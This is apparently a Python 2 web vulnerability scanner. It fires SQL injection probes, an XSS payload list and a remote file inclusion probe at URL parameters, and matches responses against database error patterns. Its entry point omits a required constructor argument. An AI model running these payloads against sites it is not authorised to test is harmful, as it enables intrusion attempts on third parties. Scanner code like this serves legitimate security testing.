#coding:utf8

import requests
import urlparse
from urllib import quote as urlencode
from urllib import unquote as urldecode
import md5
import sys
import re
import urlparse
import threading
import dbms as dbms
from config import *

reload(sys)
sys.setdefaultencoding( "utf-8" )

PROXY = {
  "http": "http://127.0.0.1:1080"
}

HEADER = {
	#'Referer' : 'http://www.wooyun.org/',
	'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
	'User-Agent' : ' Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0'
}

COOKIE = {}

vul_file = open('vulfile.txt','w')

def md5_encrypt(str):  
	m = md5.new()   
	m.update(str)   
	return m.hexdigest()  

class vul_module(threading.Thread):

	def __init__(self,url,logfile):
		threading.Thread.__init__(self)
		self.url = url
		self.sql_errors = []
		self.logfile = logfile

	def Integer_sqlinj_scan(self):
		try:
			res_md5_1 = md5_encrypt(requests.get(url=self.url,headers=HEADER).text)
			res_md5_2 = md5_encrypt(requests.get(url=self.url+urlencode('+1'),headers=HEADER).text)
			res_md5_3 = md5_encrypt(requests.get(url=self.url+urlencode('+1-1'),headers=HEADER).text)
		except Exception,e:
			print e
			res_md5_1 = res_md5_2 = res_md5_3 = 0
			pass

		if ( res_md5_1 == res_md5_3 ) and res_md5_1 != res_md5_2:
			return 1
		return 0

								
	def Str_sqlinj_scan(self):
		quotes = ['\'' , '"']

		for i in quotes:
			try:
				res_md5_1 = md5_encrypt(requests.get(url=self.url,headers=HEADER).text)
				res_md5_2 = md5_encrypt(requests.get(url=self.url+urlencode(i+' and 0;-- '),headers=HEADER).text)
				res_md5_3 = md5_encrypt(requests.get(url=self.url+urlencode(i+' and 1;-- '),headers=HEADER).text)
			except Exception,e:
				print e
				res_md5_1 = res_md5_2 = res_md5_3 = 0
				pass
			if ( res_md5_1 == res_md5_3 ) and res_md5_1 != res_md5_2:
				return 1
		return 0

	def Sql_error_scan(self):
		'''
		This method searches for SQL errors in html's.
		
		@parameter response: The HTTP response object
		@return: A list of errors found on the page
		'''
		r1 = requests.get(url=self.url,headers=HEADER)
		r2 = requests.get(url=self.url+urlencode('\''),headers=HEADER)

		res = []
		for sql_regex, dbms_type in self.Get_sql_errors():
			match1 = sql_regex.search(r1.text)
			match2 = sql_regex.search(r2.text)
			if  match2 and not match1 :
				msg = 'A SQL error was found in the response supplied by the web application,'
				msg += match2.group(0)  + '". The error was found '
				#res.append( (sql_regex, match.group(0), dbms_type) )
				return 1
		return 0


	def Xss_scan(self):
		XSS_PAYLOAD	= [
			'<script>alert(1);</script>',
			'<script>prompt(1);</script>',
			'<script>confirm(1);</script>',
			'<scr<script>ipt>alert(1)</scr<script>ipt>',
			'<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=">',
			'<svg/onload=prompt(1);>',
			'<marquee/onstart=confirm(1)>/',
			'<body onload=prompt(1);>',
			'<select autofocus onfocus=alert(1)>',
			'<textarea autofocus onfocus=alert(1)>',
			'<keygen autofocus onfocus=alert(1)>',
			'<video><source onerror="javascript:alert(1)">'		
		]
		for test in XSS_PAYLOAD:
			r = requests.get(url=self.url+urlencode(test),headers=HEADER)
			#if ( 'alert(1)' or 'prompt(1)' or 'confirm(1)' ) in r.text:
			if test in r.text:
				return 1
		return 0
		
	def FileInclude_scan(self):
		#http://192.168.87.143/fileincl/example1.php?page=intro.php
		#如上，要把参数替换成我们想要的,?page=intro.php替换为page=http://www.baidu.com
		#把全部参数都替换成了payload
		RFI_PAYLOAD = [
			"http://www.baidu.com"
		]
		url = urlparse.urlparse(self.url)
		url_query = url.query
		url_query_tmp = []
		for i in url_query.split('&'):
			i_tmp = i.replace(i.split('=')[1],RFI_PAYLOAD[0])
			url_query_tmp = url_query
			url_query_tmp = url_query_tmp.replace(i,i_tmp)
			url_tmp = urlparse.urlunparse( urlparse.ParseResult(url.scheme,url.netloc,url.path,url.params,url_query_tmp,url.fragment) )
			r = requests.get(url=url_tmp,headers=HEADER)
			if  "tieba.baidu.com" in r.text:
				return 1
		return 0
		
	def Get_sql_errors(self):
		
		if len(self.sql_errors) != 0:
			return self.sql_errors
			
		else:
			errors = []
			
			# ASP / MSSQL
			errors.append( ('System\.Data\.OleDb\.OleDbException', dbms.MSSQL ) )
			errors.append( ('\\[SQL Server\\]', dbms.MSSQL ) )
			errors.append( ('\\[Microsoft\\]\\[ODBC SQL Server Driver\\]', dbms.MSSQL ) )
			errors.append( ('\\[SQLServer JDBC Driver\\]', dbms.MSSQL ) )
			errors.append( ('\\[SqlException', dbms.MSSQL ) )
			errors.append( ('System.Data.SqlClient.SqlException', dbms.MSSQL ) )
			errors.append( ('Unclosed quotation mark after the character string', dbms.MSSQL ) )
			errors.append( ("'80040e14'", dbms.MSSQL ) )
			errors.append( ('mssql_query\\(\\)', dbms.MSSQL ) )
			errors.append( ('odbc_exec\\(\\)', dbms.MSSQL ) )
			errors.append( ('Microsoft OLE DB Provider for ODBC Drivers', dbms.MSSQL ))
			errors.append( ('Microsoft OLE DB Provider for SQL Server', dbms.MSSQL ))
			errors.append( ('Incorrect syntax near', dbms.MSSQL ) )
			errors.append( ('Sintaxis incorrecta cerca de', dbms.MSSQL ) )
			errors.append( ('Syntax error in string in query expression', dbms.MSSQL ) )
			errors.append( ('ADODB\\.Field \\(0x800A0BCD\\)<br>', dbms.MSSQL ) )
			errors.append( ("Procedure '[^']+' requires parameter '[^']+'", dbms.MSSQL ))
			errors.append( ("ADODB\\.Recordset'", dbms.MSSQL ))
			errors.append( ("Unclosed quotation mark before the character string", dbms.MSSQL ))
			
			# DB2
			errors.append( ('SQLCODE', dbms.DB2 ) )
			errors.append( ('DB2 SQL error:', dbms.DB2 ) )
			errors.append( ('SQLSTATE', dbms.DB2 ) )
			errors.append( ('\\[IBM\\]\\[CLI Driver\\]\\[DB2/6000\\]', dbms.DB2 ) )
			errors.append( ('\\[CLI Driver\\]', dbms.DB2 ) )
			errors.append( ('\\[DB2/6000\\]', dbms.DB2 ) )
			
			# Sybase
			errors.append( ("Sybase message:", dbms.SYBASE ) )
			
			# Access
			errors.append( ('Syntax error in query expression', dbms.ACCESS ))
			errors.append( ('Data type mismatch in criteria expression.', dbms.ACCESS ))
			errors.append( ('Microsoft JET Database Engine', dbms.ACCESS ))
			errors.append( ('\\[Microsoft\\]\\[ODBC Microsoft Access Driver\\]', dbms.ACCESS ) )
			
			# ORACLE
			errors.append( ('(PLS|ORA)-[0-9][0-9][0-9][0-9]', dbms.ORACLE ) )
			
			# POSTGRE
			errors.append( ('PostgreSQL query failed:', dbms.POSTGRE ) )
			errors.append( ('supplied argument is not a valid PostgreSQL result', dbms.POSTGRE ) )
			errors.append( ('pg_query\\(\\) \\[:', dbms.POSTGRE ) )
			errors.append( ('pg_exec\\(\\) \\[:', dbms.POSTGRE ) )
			
			# MYSQL
			errors.append( ('supplied argument is not a valid MySQL', dbms.MYSQL ) )
			errors.append( ('Column count doesn\'t match value count at row', dbms.MYSQL ) )
			errors.append( ('mysql_fetch_array\\(\\)', dbms.MYSQL ) )
			errors.append( ('mysql_', dbms.MYSQL ) )
			errors.append( ('on MySQL result index', dbms.MYSQL ) )
			errors.append( ('You have an error in your SQL syntax;', dbms.MYSQL ) )
			errors.append( ('You have an error in your SQL syntax near', dbms.MYSQL ) )
			errors.append( ('MySQL server version for the right syntax to use', dbms.MYSQL ) )
			errors.append( ('\\[MySQL\\]\\[ODBC', dbms.MYSQL ))
			errors.append( ("Column count doesn't match", dbms.MYSQL ))
			errors.append( ("the used select statements have different number of columns", dbms.MYSQL ))
			errors.append( ("Table '[^']+' doesn't exist", dbms.MYSQL ))

			
			# Informix
			errors.append( ('com\\.informix\\.jdbc', dbms.INFORMIX ))
			errors.append( ('Dynamic Page Generation Error:', dbms.INFORMIX ))
			errors.append( ('An illegal character has been found in the statement', dbms.INFORMIX ))
			
			errors.append( ('<b>Warning</b>:  ibase_', dbms.INTERBASE ))
			errors.append( ('Dynamic SQL Error', dbms.INTERBASE ))
			
			# DML
			errors.append( ('\\[DM_QUERY_E_SYNTAX\\]', dbms.DMLDATABASE ))
			errors.append( ('has occurred in the vicinity of:', dbms.DMLDATABASE ))
			errors.append( ('A Parser Error \\(syntax error\\)', dbms.DMLDATABASE ))
			
			# Java
			errors.append( ('java\\.sql\\.SQLException', dbms.JAVA ))
			errors.append( ('Unexpected end of command in statement', dbms.JAVA ))

			# Coldfusion
			errors.append( ('\\[Macromedia\\]\\[SQLServer JDBC Driver\\]', dbms.MSSQL ))
			
			# Generic errors..
			errors.append( ('SELECT .*? FROM .*?', dbms.UNKNOWN ))
			errors.append( ('UPDATE .*? SET .*?', dbms.UNKNOWN ))
			errors.append( ('INSERT INTO .*?', dbms.UNKNOWN ))
			errors.append( ('Unknown column', dbms.UNKNOWN ))
			errors.append( ('where clause', dbms.UNKNOWN ))
			errors.append( ('SqlServer', dbms.UNKNOWN ))
			
			#  compile them and save that into self.sql_errors. 
			for re_string, dbms_type in errors:
				self.sql_errors.append( (re.compile(re_string, re.IGNORECASE ), dbms_type) )
		
		return self.sql_errors

	def check(self,module):
		global vul_file
		url_struct = urlparse.urlparse(self.url)
		if url_struct.query != '':
			if module == 'all':
				self.run()
			if module == 'sql':
				if self.Integer_sqlinj_scan() or self.Str_sqlinj_scan() or self.Sql_error_scan():
					print get_ctime() + '\t' + self.url + ":SQL injection!"
					self.logfile.write(get_ctime() + '\t' + self.url + ":SQL injection!" + '\n')
					self.logfile.flush()

					vul_file.write(self.url + '\t' + "SQL injection!" + '\n')
					vul_file.flush()
			if module == 'xss':
				if self.Xss_scan():
					print get_ctime() + '\t' + self.url + ":XSS!"
					self.logfile.write(get_ctime() + '\t' + self.url + ":XSS!" + '\n')
					self.logfile.flush()

					vul_file.write(self.url + '\t' + "XSS!" + '\n')
					vul_file.flush()
			if module == 'rfi':
				if self.FileInclude_scan():
					print get_ctime() + '\t' + self.url + ":RFI!"
					self.logfile.write(get_ctime() + '\t' + self.url + ":RFI!" + '\n')
					self.logfile.flush()

					vul_file.write(self.url + '\t' + "RFI!" + '\n')
					vul_file.flush()



	def run(self):
		#待添加具体url匹配哪个漏洞
		print "[+] %s\t%s" % (get_ctime(),self.url)
		if self.Integer_sqlinj_scan():
			print "    Integer SQL injection!"
			self.logfile.write(get_ctime() + '\t' + self.url + ":Integer SQL injection!" + '\n')
			self.logfile.flush()
			vul_file.write(self.url + '\t' + "Integer SQL injection!" + '\n')
			vul_file.flush()
		elif self.Str_sqlinj_scan():
			print "    String SQL injection!"
			self.logfile.write(get_ctime() + '\t' + self.url + ":String SQL injection!" + '\n')
			self.logfile.flush()
			vul_file.write(self.url + '\t' + "String SQL injection!" + '\n')
			vul_file.flush()
		elif self.Sql_error_scan():
			print "    SQL error injection!"
			self.logfile.write(get_ctime() + '\t' + self.url + ":SQL error injection!" + '\n')
			self.logfile.flush()
			vul_file.write(self.url + '\t' + "SQL error injection!" + '\n')
			vul_file.flush()
		elif self.Xss_scan():
			print "    XSS vulnerabe!"
			self.logfile.write(get_ctime() + '\t' + self.url + ":XSS vulnerabe!" + '\n')
			self.logfile.flush()
			vul_file.write(self.url + '\t' + "XSS vulnerabe!" + '\n')
			vul_file.flush()
		elif self.FileInclude_scan():
			print "    RFI vulnerabe!"
			self.logfile.write(get_ctime() + '\t' + self.url + ":RFI vulnerabe!" + '\n')
			self.logfile.flush()
			vul_file.write(self.url + '\t' + "RFI vulnerabe!" + '\n')
			vul_file.flush()
		else:
			print "    safe"
			self.logfile.write(get_ctime() + '\t' + self.url + ":safe" + '\n')
			self.logfile.flush()

if __name__ == '__main__':
	url = "http://192.168.87.143/fileincl/example1.php?page=12"
	self = vul_module(url)
	self.start()